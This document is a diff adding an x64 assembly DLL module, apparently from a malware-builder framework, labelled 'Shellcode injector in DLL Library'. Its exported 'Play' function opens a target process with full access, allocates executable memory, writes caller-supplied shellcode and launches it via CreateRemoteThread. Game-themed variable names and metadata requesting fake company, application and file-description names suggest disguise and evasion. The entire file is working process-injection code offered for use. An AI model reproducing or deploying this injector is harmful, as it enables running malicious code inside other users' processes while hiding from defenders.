@@ -1,0 +1,178 @@
+#!name##DLL_Injector64
+#!types##support
+#!info##Shellcode injector in DLL Library
+#!subTypes##dll
+#!setVar##DLL_EXFUNC##Play##str
+#!options##DLL_CS##BasicDll2
+#!options##DLL_COMPILER##mingw-x64
+#!options##DLL_NO_DLL##True
+#!reqFood##FOOD_company##FOOD_company_name##Company name database
+#!reqFood##FOOD_app##FOOD_app_name##Application name database
+#!reqFood##FOOD_fdesc##FOOD_file_description##Application description database
+
+; force RIP-relative addressing
+bits 64
+default rel
+
+global DllMain
+global Play
+
+extern GetLastError
+extern OpenProcess
+extern CloseHandle
+extern VirtualAllocEx
+extern WriteProcessMemory
+extern CreateRemoteThread
+extern WaitForSingleObject
+
+section .data
+    target_player: dq 1
+    proc_handle: dq 1
+    mem_addr: dq 1
+    score: dq 1
+    hscore: dq 1
+    bytes_written: dq 1
+
+section .text
+
+DllMain:
+    mov rax, 1
+    ret
+
+; Main function. Start Injection
+; IN: rcx - process PID
+; IN: rdx - shellcode
+; IN: r8 - shellcode length
+; OUT: rax - '1' success, '0' fail
+Play:
+    mov [target_player], ecx   ; save target PID
+    ;lea rdi, [target_player]
+    ;mov qword [rdi], rcx
+    ;mov [score], rdx    ; save shellcode
+    lea rdi, [score]
+    mov qword [rdi], rdx
+    ;mov [hscore], r8     ; save shellcode length
+    lea rdi, [hscore]
+    mov qword [rdi], r8
+
+    call OpenProc
+    cmp rax, 0
+    je IN_error
+    call AllocMemory
+    cmp rax, 0
+    je IN_error
+    call WriteMem
+    cmp rax, 0
+    je IN_error
+    call CreateTH
+    cmp rax, 0
+    je IN_error
+    
+    ; success return
+    call CloseProc
+    mov rax, 1
+    ret
+    
+    IN_error:
+        call CloseProc
+        xor rax, rax
+        ret
+
+CreateTH:
+    ;create thread
+    sub rsp, 56 ; shadow space + 24 bytes in stack
+    mov rcx, [rel proc_handle]
+    xor rdx, rdx    ; lpThreadAttributes
+    xor r8, r8  ; dwStackSize
+    mov r9, [mem_addr]  ; lpStartAddress
+    mov qword [rsp + 32], 0   ;lpParameter
+    mov qword [rsp + 40], 0   ; lpParameter
+    mov qword [rsp + 48], 0
+    call CreateRemoteThread
+    add rsp, 56 ; restore stack
+    cmp rax, 0
+    je CTH_error
+    
+    xor rax, rax
+    mov rax, 1  ; return success
+    ret
+    
+    CTH_error:
+        xor rax, rax    ; return fail
+        ret
+    
+
+WriteMem:
+
+    ; write process memory
+    sub rsp, 40 ; shadow space 32 bytes + 8 bytes on stack
+    mov rcx, [proc_handle]
+    mov rdx, [mem_addr]
+    mov r8, [score]
+    mov r9, [hscore]
+    mov qword [rsp+32], bytes_written
+    call WriteProcessMemory
+    add rsp, 40 ; restore stack
+    cmp rax, 0
+    je WM_error
+    
+    
+    xor rax, rax
+    mov rax, 1  ; return success
+    ret
+    
+    WM_error:
+        xor rax, rax    ; return fail
+        ret
+        
+                  
+AllocMemory:
+    ; Allocate memory
+    sub rsp, 40 ; shadow space 32 bytes + 8 bytes on stack
+    mov rcx, [proc_handle]
+    mov rdx, 0  ; lpaddress
+    mov r8, [hscore]
+    mov r9d, 0x00001000 | 0x00002000    ; flAllocationType = MEM_COMMIT | MEM_RESERVE
+    mov dword [rsp + 32], 0x40
+    call VirtualAllocEx
+    add rsp, 40 ; restore stack
+    cmp rax, 0
+    je AM_error
+    mov [mem_addr], rax ; save memory address
+    
+    xor rax, rax
+    mov rax, 1  ; return success
+    ret
+    
+    AM_error:
+        xor rax, rax    ; return fail
+        ret
+
+OpenProc:
+    sub rsp, 32
+    ; open process
+    mov ecx, 0x1F0FFF    ; PROCESS_ALL_ACCESS
+    xor rdx, rdx
+    mov r8d, [target_player]
+    call OpenProcess
+    add rsp, 32
+    cmp rax, 0
+    je OP_error
+    mov [proc_handle], rax  ; save process handler
+    xor rax, rax
+    mov rax, 1
+    ret
+    
+    OP_error:
+        xor rax, rax
+        ret
+
+CloseProc:
+    sub rsp, 32 ;shadow space
+    mov rcx, [proc_handle]
+    call CloseHandle
+    add rsp, 32 ; restore stack
+    ret
+
+
+
